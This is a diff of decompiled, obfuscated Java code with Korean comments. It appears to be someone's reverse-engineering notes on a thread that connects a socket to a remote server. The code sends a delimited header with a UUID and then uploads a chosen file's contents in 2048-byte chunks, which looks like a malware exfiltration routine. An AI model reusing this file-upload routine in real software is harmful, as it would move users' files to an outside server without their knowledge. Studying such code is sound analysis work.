@@ -19,23 +19,24 @@ public final class d extends Thread {
     public d(String var1, int var2, String var3, String var4, String var5, String var6) {
         this.b = var1;
         this.c = var2;
-        this.f = var5;
-        this.e = var4;
         this.d = var3;
+        this.e = var4;
+        this.f = var5;
         this.g = var6;
     }
 
     // var1이라는 이름의 파일을 읽음
-    // var2와 var3가 포함된 문자열을 만들어서
-    // 2048 bytes만큼씩 var4라는 이름의 파일로 저장
+    // var2와 var3가 포함된 문자열을 만들어서 출력하고
+    // var1 파일의 내용을 2048 bytes만큼씩 서버에 출력
     private void a(String var1, String var2, String var3) {
+        // var4: Socket output stream
         DataOutputStream var4 = new DataOutputStream(this.a.getOutputStream());
         FileInputStream var6 = new FileInputStream(var1);
         var4.writeBytes(k.g + k.d + k.G + k.d + var2 + k.d + var3 + k.d + "&&&"); // 뭔가를 var4에 기록
         // [UUID]$#@@0010$#@[var2]$#@[var3]$#@&&&
         // var4 : 기록할 파일
         // var6 : 읽어들인 파일
-        // k.g: String으로 비어 있음
+        // k.g: String (랜덤 UUID로 client.java에서 assign됨)
         // k.d: $#@
         // k.G: @0010
 
@@ -45,10 +46,10 @@ public final class d extends Thread {
             var5.printStackTrace();
         }
 
-        // 도대체
         byte[] var7 = new byte[2048];
 
         while (var6.read(var7) > 0) {
+            // 서버에 var1이라는 파일의 내용을 출력한다.
             var4.write(var7);
         }
 
@@ -83,6 +84,7 @@ public final class d extends Thread {
 
     public final void run() {
         try {
+            // this.b와 this.c가 k.b와 k.c인 경우, 서버와 연결된 Socket을 만들고 this.a에 저장한다.
             this.a = new Socket(this.b, this.c);
             if (this.g == "0") {
                 this.a(this.d, this.e, this.f);
